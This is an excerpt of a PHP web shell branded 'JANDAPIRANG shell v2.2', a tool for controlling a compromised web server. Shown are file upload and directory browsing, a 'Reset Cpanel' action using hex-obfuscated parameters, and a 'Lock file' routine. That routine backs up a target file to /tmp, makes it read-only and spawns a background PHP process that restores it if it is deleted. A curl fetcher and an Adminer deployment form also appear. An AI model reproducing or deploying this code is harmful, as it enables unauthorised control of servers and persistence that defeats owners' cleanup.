...
<html>
<head>
    <title>TEAM PJP</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="author" content="JANDAPIRANG">
    <meta name="viewport" content="PIRANG" />
...
input { 
    ...
    font-size: 15px;
    color: #fff;
    text-shadow: 1px 1px 1px rgba(199, 0, 0, 0.3);
...
.JANDAPIRANG-text {
    ...
    color: #fff;
    text-align: center;
    background: linear-gradient(200deg, #311a1a 25%, #ffffff 50%, #ffffff 75%, #ffffff 100%);
...
function author() {
    echo "</div><table class='directory-listing-table'><td><center><font face='Carrois Gothic' size='3px'>2010 &copy; SEO PJP KAMBOJA</center></td></table><br>";
    exit();
}
...
function cekdir() {
    ...
    if (is_writable($serlok)) {
        return "<font color='lime'>PJPPOIPET</font>";
    } else {
        return "<font color='red'>AMAN GAK?!</font>";
    }
}
...
function net($hexnet) {
            for ($i = 0; $i < strlen($hexnet); $i++) {
                $JANDAPIRANG .= dechex(ord($hexnet[$i]));
            }
            return $JANDAPIRANG;
        }
function owner($file) {
...
echo '<table class="header"><td><center>
    <div style="font-family:Bungee Outline;font-size:24px;"><a href="'.$_SERVER['SCRIPT_NAME'].'"><i class="fa-brands fa-napster"></i> JANDAPIRANG</a></center></div></td><td>';
...
if (isset($_GET['viewfile'])) {
    ...
    <input type='file' name='JANDAPIRANGfile' id='JANDAPIRANG' style='background-color: rgb(37, 11, 11);' class='form-control' name='uplod'>
    <input type='submit' class='btn btn-outline-light' for='inputGroupFile02' name='uplod' value='Upload'></div>
     ...
     if (isset($_POST['uplod'])) {
        ...
        if (empty($_FILES['JANDAPIRANGfile']['name'])) {
            ...
            $data = @file_put_contents($serlok."/".$_FILES['JANDAPIRANGfile']['name'], @file_get_contents($_FILES['JANDAPIRANGfile']['tmp_name']));
                if (file_exists($serlok."/".$_FILES['JANDAPIRANGfile']['name'])) {
                    $fl = $serlok."/".$_FILES['JANDAPIRANGfile']['name'];
                    echo "<br><table class='directory-listing-table' style='border-color:lime;'><td>
                    Uploaded => <font color='lime'><i>".$_FILES['JANDAPIRANGfile']['name']."</i></font><br>";
...
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("resetcp").'=opet">Reset Cpanel</button><hr>&nbsp;';
    ...
    <img class='crot' src='https://media.craiyon.com/2025-04-11/bS3-aynBRhGVp3tXD8PTMg.webp'/> HIDUPLAH SEPERTI SPONGEBOB</div><hr>
    <br> - JANDAPIRANG shell v2.2 <br> - Created by JANDAPIRANG</td></thead></table>"; exit();
} elseif ($_REQUEST[net('lokfile')] == "opet") {
    echo "<table class='directory-listing-table'><td>
    <h5><i class='fa fa-lock' style='color:#1A9DD2;'></i> Lock file<font class='JANDAPIRANG-text' style='font-size:12px;'><i> Linux</i></font></h5><hr style='color:#04FBFF;'>
    ...
    if (isset($_POST['submit'])) {
        ...
        $filez = $_POST['pile'];
        $tempe = "/tmp";
        if (file_exists($tempe.'/'.md5($serlok. $filez.'-xJANDAPIRANG').JANDAPIRANG_ex($filez).'xhand.Lock') && file_exists($tempe . '/'.JANDAPIRANG_ex($filez).'-xopet')) {
            cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xopet').JANDAPIRANG_ex($filez).'xJANDAPIRANG.Lock', $serlok);
            cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xJANDAPIRANG').JANDAPIRANG_ex($filez).'xhand.Lock', $serlok);
            }
            cmd("cp $filez ".$tempe."/".md5($serlok. $filez.'-xopet').JANDAPIRANG_ex($filez).'xJANDAPIRANG.Lock', $serlok);
            @chmod($filez, 0444);
            $content = '<?php
    $tmp = "/tmp";
    $fileperm = JANDAPIRANG_perm("'.$filez.'");
    JANDAPIRANG_cmd("chmod 444 '.$filez.'");
    while (True) {
        if (!file_exists("'.$filez.'")) {
            $var = base64_encode(file_get_contents($tmp . "/'.md5($serlok. $filez.'-xopet').JANDAPIRANG_ex($filez).'xJANDAPIRANG.Lock"));
    ...
    function JANDAPIRANG_cmd($value)
    {
    ...
    function JANDAPIRANG_perm($filez){
        return substr(sprintf("%o", fileperms($filez)), -4);
    }';
    $content = file_put_contents($tempe. "/" .md5($serlok. $filez.'-xJANDAPIRANG'). JANDAPIRANG_ex($filez).'xhand.Lock', $content);
    if ($content) {
        echo "<table class='directory-listing-table' style='border-color:lime;'><td>Locked => <font color='lime'>$filez</font></td></table>";
        cmd('php '. $tempe . '/' .md5($serlok. $filez.'-xJANDAPIRANG').JANDAPIRANG_ex($filez).'"xhand.Lock" > /dev/null 2>/dev/null &', $serlok);
    } else {
...
echo'</textarea><br>
<input type="hidden" class="input" name="folfig" value="JANDAPIRANGcfg"/><br>
...
echo "<font color='aqua'>Scan Completed..!!</font></td></table><br>";
    ...
    function crot($url){
        $JANDAPIRANG = curl_init($url);
        curl_setopt($JANDAPIRANG, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($JANDAPIRANG, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($JANDAPIRANG, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($JANDAPIRANG, CURLOPT_HEADER, 0);
        return curl_exec($JANDAPIRANG);
        curl_close($JANDAPIRANG);
    } 
        echo "<table class='directory-listing-table'><td><h5><i class='fa fa-database' aria-hidden='true'></i> Adminer<font class='JANDAPIRANG-text' style='font-size:12px;'><i> v4.8.1</i></font></h5><hr><center>
    <form method='POST'>
    <div class='input-group' style='width:300px;'>
    <span class='input-group-text mb-2'>Filename :</span>
    ...
    <form method='POST'>
      ...
      function createDirectory() {
        ...
        $add = $_POST["add"];$JANDAPIRANG = mkdir($_GET['path']."/".$add);
        if ($JANDAPIRANG == true) {
...
echo '<table class="table table-dark table-hover" style="box-shadow: 0 0 20px black;width:90%;border-left:1px solid #ff1010;border-right:1px solid #ff1010;border-bottom:1px solid #ff1010;--bs-border-radius:80rem;" align="center">
...
if(is_readable($serlok)){
            ...
            foreach($fetch as $fols){
                if($fols=='.'||$fols=='..'){
                    ...
                    $JANDAPIRANGs=$serlok.'/'.$fols;
                    if(is_dir($JANDAPIRANGs)){
                        array_push($serlokbos,$fols);
                    }elseif(is_file($JANDAPIRANGs)){
